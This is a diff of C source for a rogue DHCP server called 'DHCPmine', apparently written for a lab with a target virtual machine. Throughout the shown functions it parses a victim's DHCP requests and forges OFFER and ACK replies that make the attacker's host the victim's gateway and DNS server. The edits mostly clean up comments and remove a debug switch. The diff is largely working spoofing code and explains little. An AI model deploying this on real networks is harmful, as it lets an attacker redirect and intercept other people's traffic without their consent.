@@ -10,13 +10,13 @@
 #include "DHCPmine.h"
 
 
-int debug = 1;
 
 
 char new_offer_ip[] = "192.168.56.100"; // IP address offered to victim
 char fake_server_ip[] = "192.168.56.1"; // my fake DHCP server address
 char fake_gateway[] = "192.168.56.1"; // Default gateway given to victim
 char fake_dns[] = "192.168.56.1"; // DNS server given to vicim
+char broadcast_net[] = "192.168.56.255"; // broadcast of network
 
 char fake_dhcp_ip[] = "10.0.2.15";
 
@@ -96,8 +96,8 @@ int receive_discover(int sockfd){
 
         // vicitm info 
         memcpy(&client_packet, &packet, sizeof(packet));
-        if(debug)
-            print_packet(packet);
+        print_packet(packet);
+            
         return 0;
     }
 
@@ -114,7 +114,7 @@ int send_offer(int sockfd){
     broadcast.sin_port = htons(DHCP_CLIENT_PORT);
 
     // Broadcast because the client does not have an IP yet
-    inet_pton(AF_INET, "192.168.56.255", &broadcast.sin_addr);
+    inet_pton(AF_INET, broadcast_net, &broadcast.sin_addr);
 
     broadcast.sin_addr.s_addr = INADDR_BROADCAST;
 
@@ -127,20 +127,19 @@ int receive_request(int sockfd) {
     struct dhcp_packet request;
 
     while(1) {
-        // Receive the packet
         recvfrom(sockfd, &request, sizeof(request), 0, NULL, NULL);
 
-        // 1. Verify Magic Cookie first to ensure it's a DHCP packet
+        // 0x63 0x82 0x53 0x63
+        // Magic Cookie of DHCP packet
         if (request.options[0] != 0x63 || request.options[1] != 0x82 ||
             request.options[2] != 0x53 || request.options[3] != 0x63) {
             continue; 
         }
 
         int message_type = 0;
-        unsigned int i = 4; // Start parsing immediately after the 4-byte magic cookie
+        unsigned int i = 4; // 4 byte magic cookie skip
 
-        // 2. Loop through options dynamically
-        // Since request.options is a fixed array, we can use sizeof()
+        // While going through options 
         while (i < sizeof(request.options)) {
             uint8_t opt_code = request.options[i];
 
@@ -152,61 +151,33 @@ int receive_request(int sockfd) {
                 continue;
             }
 
-            // For all other options, the next byte is the length
+            // for all other options, the next byte is the length
             uint8_t opt_len = request.options[i + 1];
 
-            // If we found Option 53 (Message Type) and its length is 1 byte
+            // Option 53 
             if (opt_code == 53 && opt_len == 1) {
-                message_type = request.options[i + 2]; // Read the value
-                break; // We found what we need, exit the loop
+                message_type = request.options[i + 2]; 
+                break; 
             }
 
-            // Jump to the next option: Code (1) + Length (1) + Data (opt_len)
+            // Jump to the next option
             i += 2 + opt_len;
         }
 
-        // 3. Check if the parsed message type is actually a DHCP_REQUEST
+        // Check if the parsed message type is DHCP_REQUEST
         if (message_type != DHCP_REQUEST) {
             continue;
         }
 
-        // 4. Check MAC address to ensure this request is from our target VM
+        // MAC check from target VM
         if (memcmp(request.chaddr, client_packet.chaddr, 6) == 0) {
-            if (debug)
-                print_packet(request);
-            return 0; // Success!
+            print_packet(request);
+            return 0; 
         }
     }
 }
 
-/*
 
-
-int receive_request(int sockfd){
-    struct dhcp_packet request;
-
-    while(1){
-        recvfrom(sockfd, &request, sizeof(request), 0, NULL, NULL);
-
-
-        while (int i=0, i<request.options.length, i++){
-            if(request.options[6] != DHCP_REQUEST){
-                // check mac and go further ?
-            }
-        continue;
-        }
-        
-            
-
-    // check mac, if request is for us
-        if(memcmp(request.chaddr, client_packet.chaddr, 6)==0){
-            if(debug)
-                print_packet(request);
-            return 0;
-        }
-    }
-}
-*/
 
 int send_ack(int sockfd){
     struct dhcp_packet ack;
@@ -226,22 +197,23 @@ int send_ack(int sockfd){
 }
 
 
+
+// https://datatracker.ietf.org/doc/html/rfc2132
+
 /*
 creates DHCP offer or ACK packet
 DHCP_OFFER = 2
 DHCP_ACK   = 5
 */
-
-// https://datatracker.ietf.org/doc/html/rfc2132
 void create_dhcp_reply(struct dhcp_packet *packet, int type) {
 
     memset(packet, 0, sizeof(*packet));
 
-    // Copy transaction info from the client (matches XID, MAC, etc.)
+    // Copy of transaction info from the client 
     memcpy(packet, &client_packet, sizeof(*packet));
     packet->op = 2;   // BOOTREPLY
 
-    // Assign IP addresses to the DHCP header
+    // ip addreses to dhcp header
     inet_pton(AF_INET, new_offer_ip, &packet->yiaddr);
     inet_pton(AF_INET, fake_server_ip, &packet->siaddr);
 
@@ -255,21 +227,21 @@ void create_dhcp_reply(struct dhcp_packet *packet, int type) {
     packet->options[3] = 0x63;
 
     int opt = 4;
-    uint32_t tmp_ip; // Temporary buffer for safe IP conversions
+    uint32_t tmp_ip; 
 
-    // 1. DHCP Message Type (MUST BE FIRST)
+    // DHCP Message Type
     packet->options[opt++] = 53;
     packet->options[opt++] = 1;
-    packet->options[opt++] = type; // e.g., 2 for DHCPOFFER
+    packet->options[opt++] = type; 
 
-    // 2. DHCP Server Identifier
+    // DHCP Server IP
     packet->options[opt++] = 54;
     packet->options[opt++] = 4;
-    inet_pton(AF_INET, fake_server_ip, &tmp_ip); // Assuming my_server_ip_string is "192.168.x.x"
+    inet_pton(AF_INET, fake_server_ip, &tmp_ip); 
     memcpy(&packet->options[opt], &tmp_ip, 4);
     opt += 4;
 
-    // 3. Subnet mask
+    // Subnet mask 255.255.255.0  /24
     packet->options[opt++] = 1;
     packet->options[opt++] = 4;
     packet->options[opt++] = 255;
@@ -277,24 +249,24 @@ void create_dhcp_reply(struct dhcp_packet *packet, int type) {
     packet->options[opt++] = 255;
     packet->options[opt++] = 0;
 
-    // 4. Router
+    // Router
     packet->options[opt++] = 3;
     packet->options[opt++] = 4;
     inet_pton(AF_INET, fake_gateway, &tmp_ip);
     memcpy(&packet->options[opt], &tmp_ip, 4);
     opt += 4;
 
-    // 5. DNS
+    // DNS
     packet->options[opt++] = 6;
     packet->options[opt++] = 4;
     inet_pton(AF_INET, fake_dns, &tmp_ip);
     memcpy(&packet->options[opt], &tmp_ip, 4);
     opt += 4;
 
-    // 6. Lease time
+    // Lease time
     packet->options[opt++] = 51;
     packet->options[opt++] = 4;
-    uint32_t lease_time = htonl(86400); // 1 day
+    uint32_t lease_time = htonl(86400); 
     memcpy(&packet->options[opt], &lease_time, 4);
     opt += 4;
 
